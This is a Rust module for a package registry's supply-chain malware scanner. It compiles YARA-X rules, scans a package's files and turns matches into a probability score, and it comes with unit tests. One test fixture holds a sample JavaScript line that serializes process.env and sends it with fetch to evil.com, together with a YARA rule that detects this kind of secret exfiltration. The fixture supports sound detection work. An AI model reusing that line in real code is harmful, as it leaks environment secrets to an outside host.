//! YARA-X–based pattern scanning for supply-chain malware detection.
//!
//! Loads `.yar` rule files from a configurable directory and scans
//! extracted source files against them.  This replaces the custom ONNX
//! model approach — no training data is required.

use std::path::PathBuf;
use std::sync::{Mutex, OnceLock};
use tracing::{debug, info, warn};

/// A single YARA match found during scanning.
#[derive(Debug, Clone)]
pub struct YaraMatch {
    /// Rule identifier (e.g. "ExfilEnvVars").
    pub rule_name: String,
    /// Threat level from rule metadata (1–5).
    pub threat_level: u8,
    /// Human-readable description from rule metadata.
    pub description: String,
    /// Category tag (e.g. "exfiltration", "obfuscation").
    pub category: String,
    /// Which file inside the package matched.
    pub matched_file: String,
}

/// Default rules directory, relative to the working directory.
const DEFAULT_RULES_DIR: &str = "rules";

/// Compiled YARA rules cache. The cache reloads when `CREG_YARA_RULES_DIR`
/// changes, which keeps tests deterministic and lets operators validate a new
/// rule directory without restarting the process.
static COMPILED_RULES: OnceLock<Mutex<RulesCache>> = OnceLock::new();

struct RulesCache {
    dir: Option<PathBuf>,
    rules: Option<yara_x::Rules>,
}

/// Return the rules directory path, overridable via `CREG_YARA_RULES_DIR`.
fn rules_dir() -> PathBuf {
    std::env::var("CREG_YARA_RULES_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from(DEFAULT_RULES_DIR))
}

/// Compile all `.yar` / `.yara` files from the rules directory.
fn compile_rules(dir: &PathBuf) -> Option<yara_x::Rules> {
    if !dir.is_dir() {
        warn!(
            "YARA rules directory '{}' not found — YARA scanning disabled",
            dir.display()
        );
        return None;
    }

    let mut compiler = yara_x::Compiler::new();
    let mut loaded = 0usize;

    let entries = match std::fs::read_dir(&dir) {
        Ok(e) => e,
        Err(err) => {
            warn!(
                "Failed to read YARA rules directory '{}': {}",
                dir.display(),
                err
            );
            return None;
        }
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
        if ext != "yar" && ext != "yara" {
            continue;
        }
        match std::fs::read_to_string(&path) {
            Ok(source) => {
                if let Err(e) = compiler.add_source(source.as_str()) {
                    warn!("Failed to compile YARA rule '{}': {}", path.display(), e);
                } else {
                    loaded += 1;
                }
            }
            Err(e) => warn!("Failed to read YARA rule '{}': {}", path.display(), e),
        }
    }

    if loaded == 0 {
        warn!(
            "No YARA rules loaded from '{}' — YARA scanning disabled",
            dir.display()
        );
        return None;
    }

    match compiler.build() {
        rules => {
            info!(
                "Compiled {} YARA rule file(s) from '{}'",
                loaded,
                dir.display()
            );
            Some(rules)
        }
    }
}

fn rules_cache() -> &'static Mutex<RulesCache> {
    COMPILED_RULES.get_or_init(|| {
        Mutex::new(RulesCache {
            dir: None,
            rules: None,
        })
    })
}

/// Whether a non-empty YARA rule bundle was loaded successfully.
///
/// Public-testnet admission uses this as a fail-closed guard before packages
/// enter the pending pool.
pub fn rules_available() -> bool {
    let dir = rules_dir();
    let mut cache = rules_cache().lock().expect("YARA rules cache poisoned");
    if cache.dir.as_ref() != Some(&dir) {
        cache.rules = compile_rules(&dir);
        cache.dir = Some(dir);
    }
    cache.rules.is_some()
}

/// Scan extracted source files with YARA rules.
///
/// `files` is a list of `(relative_path, content)` pairs extracted from a
/// package tarball.  Returns a list of matches sorted by threat level (highest
/// first).
pub fn scan_files(files: &[(String, String)]) -> Vec<YaraMatch> {
    let dir = rules_dir();
    let mut cache = rules_cache().lock().expect("YARA rules cache poisoned");
    if cache.dir.as_ref() != Some(&dir) {
        cache.rules = compile_rules(&dir);
        cache.dir = Some(dir);
    }

    let Some(rules) = cache.rules.as_ref() else {
        return Vec::new();
    };

    let mut matches = Vec::new();

    for (path, content) in files {
        let mut scanner = yara_x::Scanner::new(rules);
        let scan_results = scanner.scan(content.as_bytes());

        match scan_results {
            Ok(results) => {
                for rule in results.matching_rules() {
                    let threat_level = rule
                        .metadata()
                        .into_iter()
                        .find(|(id, _)| *id == "threat_level")
                        .and_then(|(_, val)| match val {
                            yara_x::MetaValue::Integer(v) => Some(v as u8),
                            _ => None,
                        })
                        .unwrap_or(3);

                    let description = rule
                        .metadata()
                        .into_iter()
                        .find(|(id, _)| *id == "description")
                        .and_then(|(_, val)| match val {
                            yara_x::MetaValue::String(s) => Some(s.to_string()),
                            _ => None,
                        })
                        .unwrap_or_else(|| rule.identifier().to_string());

                    let category = rule
                        .metadata()
                        .into_iter()
                        .find(|(id, _)| *id == "category")
                        .and_then(|(_, val)| match val {
                            yara_x::MetaValue::String(s) => Some(s.to_string()),
                            _ => None,
                        })
                        .unwrap_or_else(|| "unknown".to_string());

                    matches.push(YaraMatch {
                        rule_name: rule.identifier().to_string(),
                        threat_level,
                        description,
                        category,
                        matched_file: path.clone(),
                    });
                }
            }
            Err(e) => {
                debug!("YARA scan error for '{}': {}", path, e);
            }
        }
    }

    matches.sort_by(|a, b| b.threat_level.cmp(&a.threat_level));
    matches
}

/// Convert YARA matches to a malicious probability score (0.0 – 1.0).
pub fn matches_to_probability(matches: &[YaraMatch]) -> f32 {
    if matches.is_empty() {
        return 0.0;
    }

    let max_threat: f32 = matches
        .iter()
        .map(|m| m.threat_level as f32)
        .fold(0.0f32, f32::max);

    // Map threat levels: 5→0.95, 4→0.80, 3→0.55, 2→0.35, 1→0.15
    let base = match max_threat as u8 {
        5 => 0.95,
        4 => 0.80,
        3 => 0.55,
        2 => 0.35,
        _ => 0.15,
    };

    // Boost slightly for multiple matches (capped at +0.05)
    let count_boost = ((matches.len() as f32 - 1.0) * 0.01).min(0.05);

    (base + count_boost).min(1.0)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build an in-memory YARA scanner for testing (bypasses the rules-dir singleton).
    fn scan_with_inline_rules(rule_src: &str, files: &[(String, String)]) -> Vec<YaraMatch> {
        let mut compiler = yara_x::Compiler::new();
        compiler.add_source(rule_src).expect("rule should compile");
        let rules = compiler.build();

        let mut matches = Vec::new();
        for (path, content) in files {
            let mut scanner = yara_x::Scanner::new(&rules);
            if let Ok(results) = scanner.scan(content.as_bytes()) {
                for rule in results.matching_rules() {
                    let threat_level = rule
                        .metadata()
                        .into_iter()
                        .find(|(id, _)| *id == "threat_level")
                        .and_then(|(_, val)| match val {
                            yara_x::MetaValue::Integer(v) => Some(v as u8),
                            _ => None,
                        })
                        .unwrap_or(3);

                    matches.push(YaraMatch {
                        rule_name: rule.identifier().to_string(),
                        threat_level,
                        description: String::new(),
                        category: String::new(),
                        matched_file: path.clone(),
                    });
                }
            }
        }
        matches
    }

    #[test]
    fn test_yara_detects_env_exfiltration() {
        let rule = r#"
            rule ExfilEnvVars {
                meta:
                    threat_level = 5
                strings:
                    $env = "process.env" nocase
                    $send = "fetch(" nocase
                condition:
                    $env and $send
            }
        "#;
        let files = vec![(
            "index.js".to_string(),
            "const e = process.env; fetch('https://evil.com', {body: JSON.stringify(e)})"
                .to_string(),
        )];
        let matches = scan_with_inline_rules(rule, &files);
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].rule_name, "ExfilEnvVars");
        assert_eq!(matches[0].threat_level, 5);
    }

    #[test]
    fn test_yara_clean_file_no_match() {
        let rule = r#"
            rule ExfilEnvVars {
                meta:
                    threat_level = 5
                strings:
                    $env = "process.env" nocase
                    $send = "fetch(" nocase
                condition:
                    $env and $send
            }
        "#;
        let files = vec![(
            "index.js".to_string(),
            "console.log('hello world');".to_string(),
        )];
        let matches = scan_with_inline_rules(rule, &files);
        assert!(matches.is_empty());
    }

    #[test]
    fn test_yara_multiple_files_multiple_rules() {
        let rule = r#"
            rule RuleA {
                meta:
                    threat_level = 4
                strings:
                    $a = "MALICIOUS_A"
                condition:
                    $a
            }
            rule RuleB {
                meta:
                    threat_level = 2
                strings:
                    $b = "MALICIOUS_B"
                condition:
                    $b
            }
        "#;
        let files = vec![
            ("a.js".to_string(), "MALICIOUS_A is here".to_string()),
            ("b.py".to_string(), "MALICIOUS_B pattern found".to_string()),
        ];
        let matches = scan_with_inline_rules(rule, &files);
        assert_eq!(matches.len(), 2);
    }

    #[test]
    fn test_matches_to_probability_empty() {
        assert_eq!(matches_to_probability(&[]), 0.0);
    }

    #[test]
    fn test_matches_to_probability_high_threat() {
        let matches = vec![YaraMatch {
            rule_name: "test".into(),
            threat_level: 5,
            description: String::new(),
            category: String::new(),
            matched_file: "f.js".into(),
        }];
        let prob = matches_to_probability(&matches);
        assert!((prob - 0.95).abs() < 0.01);
    }

    #[test]
    fn test_matches_to_probability_multi_boost() {
        let matches = vec![
            YaraMatch {
                rule_name: "a".into(),
                threat_level: 4,
                description: String::new(),
                category: String::new(),
                matched_file: "a.js".into(),
            },
            YaraMatch {
                rule_name: "b".into(),
                threat_level: 3,
                description: String::new(),
                category: String::new(),
                matched_file: "b.js".into(),
            },
        ];
        let prob = matches_to_probability(&matches);
        // base 0.80 + 0.01 for extra match = 0.81
        assert!((prob - 0.81).abs() < 0.01);
    }

    #[test]
    fn test_scan_files_empty_input() {
        let files: Vec<(String, String)> = vec![];
        let matches = scan_files(&files);
        assert!(matches.is_empty());
    }
}
